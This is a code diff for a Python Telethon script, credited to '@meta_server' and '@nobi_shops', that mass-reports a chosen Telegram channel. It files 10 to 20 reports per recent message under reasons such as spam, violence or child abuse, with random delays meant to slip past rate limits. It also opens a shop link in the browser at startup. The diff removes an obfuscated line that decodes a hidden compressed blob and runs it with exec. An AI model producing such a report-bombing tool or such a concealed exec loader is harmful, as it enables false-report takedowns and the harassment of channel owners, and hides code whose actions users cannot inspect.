@@ -1,4 +1,135 @@
+import webbrowser
+webbrowser.open("https://t.me/nobi_shops")
 
+import asyncio
+import random
+from telethon import TelegramClient
+from telethon.tl.functions.messages import ReportRequest
+from telethon.tl.types import (
+    InputReportReasonSpam, 
+    InputReportReasonViolence,
+    InputReportReasonPornography,
+    InputReportReasonChildAbuse,
+    InputReportReasonOther
+)
 
+API_ID = YOUR_API_ID 
+apihash = "YOUR_API_HASH "
 
-_1nf3r10r_ = lambda __1nf3r10r__ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__1nf3r10r__[::-1])));eval("exec((_1nf3r10r_)(b')@FJO*>F2|qZx*4804%An+!STwFCBa786L=QKZjTbfwN_nm>XlR`LSBTNQaNEB=`!-iGQnhmDwa&v9k)jJhW0FzC=bH=%gG)>O!tx6#zh$6e;cY$^h8adgLhZ5@Q6GmdN*CeK3mX9n77jM)W)ONx?wvYa1Ii<og?=QzXbkMpX1~p_PTgR&3>4m~*+@vjL8rzY*_aHll9nA_<FBUFvLw(H%ZdI1Eg6#D};b?8&I9#o+Gt%Fvzet}I`mwZO^b9W7M+xWb*Awr2ygjl3l)qUD*NgT1gJ^)KEw}38d+pB~bVf^XQwo;Ny5-ZSf+Wz`+bDW}Po;?#F>WKK&6)M6)B=EllE-J(85N(c9T;1wMV+!O8@)y$W&CoYs7fU7v!_rHLEY|;lG6!e#k4=SZEyb3oF+b~pz1W@I>#!{yH<<*B&Z-<*wS8)6hD-#{lFg46f2ZCTti$LPuuZ@7H_;~=!RQ3@Y8+MJ_Gtt$V~ACdSZn7$a2rM%6LH3cswH3F$A>L!A~3NZ|sDCelGjA?m;feM826)IykFdLya*{7&`<z2`&htD36l3!B7nSyR)^pOKpUw9`HX0@!Rjr&0~nb_oRtwZ9wuZf0o#PkfHs9unh#Xm1V(6;3e)4rcnY$Iia_<`oOQ0u7&ahPbc<jguEhX@LLBBnJqTzV}->-ohpckKEpK15*g|q?)S=r;hIi-#Cqj$u~FvHzdXMM+KGr<Ce%jUBq7?r$UMfYMUoB1ZS*r-&PPS#KcMQ|Tc<P!)+3D}5RKLiJvMH`sxadS@dL(0AVuGZBDVHBcwqGZ;(UjJ?xbge4|`OR*lz}I&QOck907%$!B52FXpD1YJJD#^bm-9O0?XhR);D1H%SkcknR;KpZq&V##^)0obx!2aH0KEV?#EMM0l3xMOrXSoE#e~=D|=$oJd4a=Bx?(r$Pz#rMhb?5oI*A%D{$?c>M2c&X6@+#$RQOG5*!;nVZ1?!8%DvsY!8$lSF+~&J%1aUPX*{K;AHp{i2eiFu@42TX14GkyA#&j7}aRy?LAt;&vox4o1U#ufCKv9o%ucTmSzt5`qCZ@_R=j(>ayBSvkc6>lWUIiL4l?uSP=J$cx4VM?)G5fc_La`l2?RKKM^K4cb~&ttSfE9%j1M+-<v+JX7nqun<+MK?EB$NI--3D2kl!8mgm?jzn@tYl-7NzrjKV__5+2bD7H1#Y!h)!pCq~~YkblGyp|<dB9G9+JC1);D1`xAG37Fg=##3RuQae@f%i%<Z$`L@;1Os$P0mOvq5J6Io)$}-W+91BIB~2Nh7luHipI5jG?VsAU!S8kTux*vlC_ic2xwei1P~PKn7IL&8K^oq(`ZdeQQwv74y&TB<*FrB(YDSq+CZNpe#%++&5%iI{B+6wB(4}7zA=0{L0mkgzPy)%LJGiwzr1aqlUkPXLH;EFlQw9t!AFRieM4NZlN5sM5gS4Y9OCaguaJF!oZ;=7HmU`VpKu3rLx8f4woctFtgz4jP;<Pq+4Wtz#bd+8OP;p+fjm2`Me7}08V+nG^1=upf^qTU*O9G>4RiMu5P_pPV=_J+FXqiQM(wUsxQ8#R*bn3g_cECR$Ji!U5bZ`@xL-+9d=N$xspc(@h3a+_wJyUTxd~jvqW_gwou9-Ze(sS1R~0?6=cr>*02u!xT5_CjcK|DIzgvNow}^o?y8%--wwbqL-`dKMx^WcIPqk`-iOY<xreGH2F5}<_o?~9vJ=)8`?CF}9Zb)wFbrUM$+?4$n)?gvHRK;eDj@67(wx5ey)GGC+EDwj$>z+0DU+^@xzkxqHB?<+Qcq*Gp0X~p9X?Bx;TTD9@y;wX}`w^_zUBI|_A96M>j4t>C<>gZW_Ku?Sq-Y7!PVHS@hUAw@f%euc8g`I5@~X>Q0d4=%!qwJ2O;=@Z>hs@OfMIgM_*Vn(^fG)spge5mV?ILbw9K2GUlI8QyX`+B^cT<2z?`dxPx=F`Jb$A-tJS4-`RC7!UrVl5)(<6sire9cGAKT@85}O&NkE^Gk_TZRnFV3sYzxA2b4y0-32r#+2cmgUgFMzY=EbU*LIJyTcTSwMTo_gt36jG!VAg2O(}G>tp1|Gb`8Hdms6}CaQO0<KZ!0m=$jgP6z@L586SQ<3sSay}EyxUok?_ChY3>B)C55&)SLg^syHUA==rITB#NH64gSTsgyb55Xp&W))CbhS#$gka6wIYKQ5ig>RLP8iSr<VK1nWA}DCu>#W7#HUm9a*|fWqyaXY&!@Z8l|ie2C${aV5eKzmG-Un?2m}pIluWHZuguUy8mm{X;U6$Fm_&gm*AC$#`QyAdYthS8RxPFy0-vsEd_K+Fc3WRd)7Ft8pC08m;!!@DEX7<C?Z7!e?w1)mxnBBCVjspCIpps<(#rwM!>e0VPzpC?HvmJwaMnj_Su-T`cx~FNP0{HfhHd`9-}N@djAtR_wZrh;$Ld1rU<YJdjRr3yn38Hm)LSFo$voXpPRi*UqIIc$fx2&y>=bTE8$e&+IrGiRsp;C)=*5M$8c|mO6|AzkT^SukHtQY_v3GlW5D%&mcWO|c}5;R7G|dGjnJkPg55^w&*W3Rc$IUXbC1!vghS&NxxN426ZFdAytAKoJmGbb!DE&KT*0#!soIkV2ZTFjHfatee_^{ib!bb2XRm>z52I087{B>2ba>}?tT|4D|T-YN|2`%(<06Fgex$KwDN?}l7nof6O{vnh6*>h~6WL4veM*G!0gyxt+DK^$c'))")
+class ziddi:
+    def __init__(self, api_id, api_hash):
+        self.client = TelegramClient('session', api_id, api_hash)
+        self.report_reasons = {
+            '1': InputReportReasonSpam(),
+            '2': InputReportReasonViolence(), 
+            '3': InputReportReasonPornography(),
+            '4': InputReportReasonChildAbuse(),
+            '5': InputReportReasonOther()
+        }
+
+    async def start(self):
+        await self.client.start()
+        print("Telegram'a bağlandı ✓")
+
+    async def report_channel(self):
+        channel_link = input("Channel links: ").strip() # by @meta_server
+        
+        try:
+            channel = await self.client.get_entity(channel_link)
+            print(f" channel found: {channel.title}")
+            
+
+            print("\nTelegram: @meta_server \ @nobi_shops")
+            print("1. Spam")
+            print("2. Violence")
+            print("3. Pornography")
+            print("4. child abuse")
+            print("5. Other")
+            
+            choice = input("Your choice (1-5): ").strip()
+            if choice not in self.report_reasons:
+                print("invalid selection")
+                return
+            
+            reason = self.report_reasons[choice]
+            description = ""
+            
+            if choice == '5':
+                description = input("Explanation: ").strip()
+
+            
+            messages = await self.client.get_messages(channel, limit=10)
+            
+            if not messages:
+                print("There are no messages in the channel.")
+                return
+
+            print(f"{len(messages)} message found.")
+            
+            success_count = 0
+            total_reports = 0
+            
+            for msg_num, message in enumerate(messages, 1):
+                if message.id is None:
+                    continue
+                
+                
+                
+                
+                reports_for_this_msg = random.randint(10, 20)
+                
+                for report_num in range(1, reports_for_this_msg + 1):
+                    try:
+                        wait_time = random.uniform(3, 8)
+                        await asyncio.sleep(wait_time)
+                        
+
+                        result = await self.client(ReportRequest(
+                            peer=channel,
+                            id=[message.id],
+                            reason=reason,
+                            message=description
+                        ))
+                        
+                        success_count += 1
+                        total_reports += 1
+                        
+                        if report_num % 5 == 0:
+                            print(f"   {report_num}/{reports_for_this_msg} report sent ✅ ") #@meta_server
+                            
+                    except Exception as e:
+                        ''
+                        await asyncio.sleep(10)  
+                
+                
+
+            print(f"Telegram: @meta_server | @nobi_shops !")
+            print(f"Total {total_reports} report sent ✅")
+            print(f"Channel: {channel.title}")
+
+        except Exception as e:
+            ''
+
+    async def stop(self):
+        await self.client.disconnect()
+
+async def main():
+    bot = ziddi(API_ID, apihash)
+    
+    try:
+        await bot.start()
+        await bot.report_channel()
+    except KeyboardInterrupt:
+        ''
+    except Exception as e:
+        ''
+    finally:
+        await bot.stop()
+        ''
+
+if __name__ == '__main__':
+    asyncio.run(main())
+    
+    
+    
+    # tg @meta_server / @nobi_shops
